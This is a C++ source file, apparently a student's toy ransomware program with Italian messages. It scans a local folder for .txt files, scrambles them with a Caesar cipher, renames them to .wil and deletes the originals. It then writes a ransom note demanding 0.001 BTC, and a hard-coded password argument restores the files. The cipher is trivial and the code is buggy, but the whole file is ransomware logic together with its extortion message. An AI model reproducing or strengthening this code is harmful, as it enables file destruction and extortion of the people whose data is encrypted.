//
// Created by lucac on 2024/01/16.
//
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>

const int MAXa=100;

using namespace std;

namespace fs = filesystem;

void findAndPrintTxtFiles(const string& directoryPath, string paths[]) {
    int i=0;
    string tmp;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
            if (fs::is_regular_file(entry) && entry.path().extension() == ".txt") {
                cout << "File .txt trovato: " << entry.path().string() << endl;
                tmp = entry.path().string();
                paths[i] = tmp;
                i++;
            }
        }
    }
    catch (const exception& e) {
        cerr << "Errore durante la scansione della cartella: " << e.what() << endl;
    }
}

void findAndPrintWilFiles(const string& directoryPath, string wilpaths[]) {
    int i=0;
    string tmp;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
            if (fs::is_regular_file(entry) && entry.path().extension() == ".wil") {
                cout << "File .txt trovato: " << entry.path().string() << endl;
                tmp = entry.path().string();
                wilpaths[i] = tmp;
                i++;
            }
        }
    }
    catch (const exception& e) {
        cerr << "Errore durante la scansione della cartella: " << e.what() << endl;
    }
}

void encryptFile(const string& filePath) {
    ifstream inputFile(filePath);
    string fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    // Encrypt the file content using Caesar cipher
    int shift = 3;
    for (char& c : fileContent) {
        if (isalpha(c)) {
            if (islower(c)) {
                c = ((c - 'a' + shift) % 26) + 'a';
            } else if (isupper(c)) {
                c = ((c - 'A' + shift) % 26) + 'A';
            }
        }
    }

    string encryptedFilePath = filePath;
    size_t pos = encryptedFilePath.find(".txt");
    if (pos != std::string::npos) {
        encryptedFilePath.replace(pos, 4, ".wil");
    }

    ofstream outputFile(encryptedFilePath);
    outputFile << fileContent;
    outputFile.close();

    remove(filePath.c_str());
}

void encryptFiles(string paths[]) {
    for (int i=0; i<MAXa; i++) {
        encryptFile(paths[i]);
    }
}

void decryptFile(const string& filePath) {
    ifstream inputFile(filePath);
    string fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    // Decrypt the file content using Caesar cipher
    int shift = 3;
    for (char& c : fileContent) {
        if (isalpha(c)) {
            if (islower(c)) {
                c = (c - 'a' - shift + 26) % 26 + 'a';
            } else if (isupper(c)) {
                c = (c - 'A' - shift + 26) % 26 + 'A';
            }
        }
    }
    
    string decryptedFilePath = filePath;
    size_t pos = decryptedFilePath.find(".wil");
    if (pos != std::string::npos) {
        decryptedFilePath.replace(pos, 4, ".txt");
    }

    ofstream outputFile(decryptedFilePath);
    outputFile << fileContent;
    outputFile.close();

    remove(filePath.c_str());
}

void decryptFiles(string paths[]) {
    for (int i=0; i<MAXa; i++) {
        decryptFile(paths[i]);
    }
}

void createmessagefile(string paths[], string directorypath) {
    string msgpath = directorypath + "\\message.msg";
    ofstream outputFile(msgpath.c_str());
    for (int i=0; i < MAXa; i++) {
        outputFile << paths[i] << endl;   
        if (paths[i] == "")
        {
            break;
        }
    }
    outputFile << R"(
Benvenuto nella famiglia CrittaCritta3AIA. Se vuoi riavere i tuoi file invia 0.001 BTC al seguente indirizzo: Fr44sWLLPZz554
Grazie per il supporto
luca@dallh2o.com            
        )";
    outputFile.close();
}

void deletemessagefile(string directorypath) {
    string msgpath = directorypath + "\\message.msg";
    remove(msgpath.c_str());
}

int main(int argc, char* argv[]) {
    string directoryPath = ".\\rubari";  // Sostituisci con il percorso desiderato
    string paths[MAXa];
    string wilpaths[MAXa];
    findAndPrintTxtFiles(directoryPath, paths); 
    cout << argv[1] << endl;
    if (argc > 1){
        string argument = argv[1]; // Convert argv[1] to string
        if (argument == "encrypt") {
            encryptFiles(paths);
            createmessagefile(paths, directoryPath);
        } else if (argument == "superSecretPassword") {
            findAndPrintWilFiles(directoryPath, wilpaths);
            decryptFiles(wilpaths);
            deletemessagefile(directoryPath);
        } else {
            cout << "Invalid argument" << endl;
        }    
    }
    return 0;
}